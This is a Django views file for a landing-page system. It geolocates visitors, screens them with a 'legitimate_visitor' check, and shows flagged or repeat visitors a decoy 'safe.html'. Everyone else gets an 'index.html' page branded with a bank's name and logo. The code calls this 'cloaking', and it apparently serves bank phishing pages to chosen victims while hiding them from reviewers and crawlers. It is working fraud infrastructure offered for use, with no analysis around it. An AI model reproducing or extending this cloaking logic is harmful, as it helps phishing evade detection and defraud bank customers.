import datetime
import traceback

from django.shortcuts import render_to_response, HttpResponse, HttpResponseRedirect, get_object_or_404
from django.core.urlresolvers import reverse
from django.conf import settings
from pygeoip import GeoIP, GeoIPError
from django.core.mail import send_mail, mail_managers

from website.models import Keyword, Visitor
from website.helpers import generate_subid, legitimate_visitor, get_client_ip


geoip = GeoIP(settings.GEOIP_DB_PATH)


def landing_page(request, keyword, lp='lp5'):
    subid = generate_subid()
    visitor = save_visitor(request, keyword, lp)
    visitor.text = subid
    visitor.save()

    return HttpResponseRedirect(reverse('website.views.unique_subid', args=[subid,]))

def unique_subid(request, subid):

    visitor = get_object_or_404(Visitor, text=subid)

    ip = request.META.get('HTTP_X_REAL_IP', '')
    day_ago = datetime.datetime.now()-datetime.timedelta(days=1)

    context = {
        'v': visitor,
        'logo': visitor.keyword.image.url,
        'bank': visitor.keyword,
        'subid': visitor.text,
    }

    if visitor.visit_datetime > day_ago:
        # One more visit, just showing safe page
        return render_to_response('%s/safe.html' % visitor.lp, context)

    else:
        # First hit in a day
        if visitor.country_code in ('EG', 'NL'):  # Allow Egypt and Netherlands always
            visitor.cloaked = False
            visitor.reason = ''
        visitor.visit_datetime = datetime.datetime.now()  # Saving last access time

    visitor.ip = ip
    visitor.save()

    if visitor.cloaked:
        return render_to_response('%s/safe.html' % visitor.lp, context)

    return render_to_response('%s/index.html' % visitor.lp, context)


def ip_details(request):
    # TODO: Shouldn't real IP be used here?
    ip =  request.META.get('HTTP_X_REAL_IP', '')
    ip = request.META['REMOTE_ADDR']
    ip = '93.174.93.224'
    geo_data = geoip.record_by_addr(ip)

    return HttpResponse(geo_data.items())


def save_visitor(request, keyword_text, lp):
    v = Visitor()
    v.visit_datetime = datetime.datetime.now()
    v.ip = request.META.get('HTTP_X_REAL_IP', '')
    v.ua = request.META['HTTP_USER_AGENT'][:100]
    keyword = get_object_or_404(Keyword, keyword=keyword_text)
    v.keyword = keyword
    v.lp = lp
    v.dt = datetime.datetime.now()
    try:
        geo_data = geoip.record_by_addr(str(v.ip))
    except GeoIPError:
        geo_data = geoip.record_by_addr('71.227.57.247')
    if geo_data is None:
        geo_data = {}

    v.city = geo_data.get('city','').lower()
    v.state = geo_data.get('region_name','')
    v.country_code = geo_data.get('country_code','')
    v.zip_code = geo_data.get('postal_code','')

    v.reason = legitimate_visitor(v.ip, geo_data, v)
    if v.reason: #Reason to cloak
        v.cloaked = True
    else:
        v.cloaked = False #no need to cloak

    v.save()

    return v
